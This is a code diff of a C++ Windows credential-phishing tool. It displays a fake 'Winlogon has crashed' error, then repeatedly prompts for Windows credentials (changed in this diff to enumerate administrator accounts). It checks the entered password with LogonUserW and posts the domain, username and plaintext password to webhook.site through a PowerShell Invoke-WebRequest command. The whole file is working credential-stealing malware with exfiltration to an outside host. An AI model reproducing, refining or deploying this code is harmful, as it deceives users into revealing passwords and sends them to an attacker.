@@ -10,11 +10,11 @@
 #pragma comment(lib, "Credui.lib")
 
 void spoof() {
-	
+
 	BOOL loginStatus = FALSE;
-	MessageBoxA(nullptr,"Winlogon has crashed unexpectedly.Please enter your password to connect to winlogon","Authentication", MB_OK | MB_ICONERROR);
+	MessageBoxA(nullptr, "Winlogon has crashed unexpectedly.Please enter your password to connect to winlogon", "Authentication", MB_OK | MB_ICONERROR);
 	do {
-		
+
 		CREDUI_INFOW credui = {};
 		credui.cbSize = sizeof(credui);
 		credui.hwndParent = nullptr;
@@ -28,7 +28,7 @@ void spoof() {
 		BOOL save = false;
 		DWORD err = 0;
 
-		err = CredUIPromptForWindowsCredentialsW(&credui, err, &authPackage, nullptr, 0, &outCredBuffer, &outCredSize, &save, CREDUIWIN_ENUMERATE_CURRENT_USER); // to get pass of current user logged-in
+		err = CredUIPromptForWindowsCredentialsW(&credui, err, &authPackage, nullptr, 0, &outCredBuffer, &outCredSize, &save, CREDUIWIN_ENUMERATE_ADMINS); // to get pass of current user logged-in
 	  //err = CredUIPromptForWindowsCredentialsW(&credui, err, &authPackage, nullptr, 0, &outCredBuffer, &outCredSize, &save, NULL);
 		if (err == ERROR_SUCCESS) {
 			WCHAR pszUName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
@@ -45,12 +45,14 @@ void spoof() {
 
 			HANDLE handle = nullptr;
 			loginStatus = LogonUserW(parsedUserName, parsedDomain, pszPwd, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &handle);
-			auto output = std::wstring(parsedDomain);
+			auto output = std::wstring(L"Domain:");
+			output.append(parsedDomain);
+			output.append(L"--Username:");
 			output.append(parsedUserName);
+			output.append(L"--Password:");
 			output.append(pszPwd);
 			std::string out(output.begin(), output.end());
-			std::string ss = "cmd /c powershell Invoke-WebRequest -Uri 'https://webhook.site/' -Body " + out + " -Method POST";  // type webhook or ngrok
-
+			std::string ss = "powershell Invoke-WebRequest -Uri 'https://webhook.site/' -Body " + out + " -Method POST";  // type webhook or ngrok
 			if (loginStatus == TRUE) {
 				CloseHandle(handle);
 				system(ss.c_str());
@@ -61,7 +63,7 @@ void spoof() {
 	} while (loginStatus == FALSE);
 }
 
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+int main()
 {
 	spoof();
 	return 0;
